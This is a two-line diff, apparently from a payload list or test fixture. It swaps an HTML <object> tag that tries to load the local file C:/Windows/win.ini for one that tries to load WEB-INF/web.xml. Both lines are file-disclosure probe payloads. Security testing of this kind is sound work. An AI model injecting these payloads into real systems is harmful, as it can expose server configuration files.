@@ -1,2 +1,2 @@
   
-<object width="400" height="400" data="file:///C:/Windows/win.ini"></object>
+<object width="400" height="400" data="file:///WEB-INF/web.xml"></object>
